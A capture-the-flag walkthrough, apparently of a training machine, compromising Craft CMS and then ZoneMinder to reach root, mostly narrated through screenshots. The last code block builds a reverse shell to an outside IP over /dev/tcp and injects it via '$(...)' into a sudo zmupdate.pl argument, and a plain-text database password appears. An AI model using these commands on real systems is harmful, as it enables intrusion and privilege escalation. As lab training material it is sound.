# Surveillance

```bash
nmap -sC -sV -p- -vv -oN nmap/full $target
```

![NmapScan](Screenshots/2023-12-21-20-21-23.png)

craft cms 4.4.14

![CVE-2023-41892](Screenshots/2023-12-21-20-56-14.png)

![www-data shell](Screenshots/2023-12-21-20-56-49.png)

![stable shell](Screenshots/2023-12-21-21-02-23.png)

![/html/craft/.env](Screenshots/2023-12-21-21-05-26.png)

We discover MySql credentials but that's a deadend, since the hash isn't crackable.

![p.zip](Screenshots/2023-12-21-21-04-36.png)

We'll unzip the files to check the contents, you can transfer the files to your machine, unzip them in /tmp or any other way you'd preffer.

```bash
mkdir -p /tmp/moon
unzip p.zip -d /tmp/moon/
```

![matthew hash](Screenshots/2023-12-21-21-10-35.png)

![cracked hash](Screenshots/2023-12-21-21-11-10.png)

With the password we can now ssh in as matthew

```bash
ssh matthew@$target
```

![Matthew shell](Screenshots/2023-12-21-21-15-08.png)

![user flag](Screenshots/2023-12-21-21-16-33.png)

By running a find command looking for zoneminder user group we find /usr/share/zoneminder

```bash
find / -type f -group zoneminder 2>/dev/null
```

![find Group](Screenshots/2023-12-21-21-20-23.png)

At this point your enumeration skills will come realy in play, as there's alot of files with extensive information, greping for keywords here is quite useful as it's a web app of sorts. So keywords such as password, secret, version, pass, db, database, etc. will gain you quite a bit of information.

```bash
grep password -Ri . 2>/dev/null
```

![database.php](Screenshots/2023-12-21-21-25-55.png)

Credentials but gain the database isn't useful with it's contents.

![log path](Screenshots/2023-12-21-21-33-25.png)

Knowing where logs are a good place to look for more information.

![port 2222 usage](Screenshots/2023-12-21-21-35-08.png)

The fact that we notice a port being used it might be a good time to check what's running locally:

```bash
netstat -tulpn
```

![netstat](Screenshots/2023-12-21-21-36-15.png)

However here we don't see port 2222 used, however there is a port 8080. 3306 is mysql and 53 is DNS, so we can ignore those, but 8080 is worth looking into.

```bash
curl localhost:8080
```

By curling the port we can get a glimpse what's there. Now that we're sure there's something there we need to tunnel it so that we can get a visual.

```bash
ssh matthew@$target -L 2222:localhost:8080
```

![Zoneminder app](Screenshots/2023-12-21-21-42-04.png)

Found the app, but we netiher have credentials nor a version number, so let's look for default creds online, see if those work, if not let's find a version number.

![ZM version](Screenshots/2023-12-21-21-46-32.png)

As the version we found is 1.36.32 Let's look for any known exploits.

[PoC CVE-2023-26035 by heapbytes](https://github.com/heapbytes/CVE-2023-26035)

We follow the instructions and get a shell.

![zoneminder rebshell](Screenshots/2023-12-21-21-51-41.png)

Checking sudo priviledges real quick:

![Sudo -l](Screenshots/2023-12-21-21-53-51.png)

We can run any perl script within /usr/share/ following a cerain pattern.

![Unescaped dbUser](Screenshots/2023-12-21-22-05-09.png)

![explanation](Screenshots/2023-12-21-22-07-31.png)

```bash
mkdir -p /tmp/Mythical
echo 'echo "sh -i >& /dev/tcp/10.10.16.72/9005 0>&1" | bash' > /tmp/Mythical/shell.sh
chmod +x /tmp/Mythical/shell.sh
sudo /usr/bin/zmupdate.pl -v 69 -u '$(/tmp/Mythical/shell.sh)' -p ZoneMinderPassword2023
```

Set up a listener and fire off the sudo command.

![Root shell](Screenshots/2023-12-21-22-26-57.png)

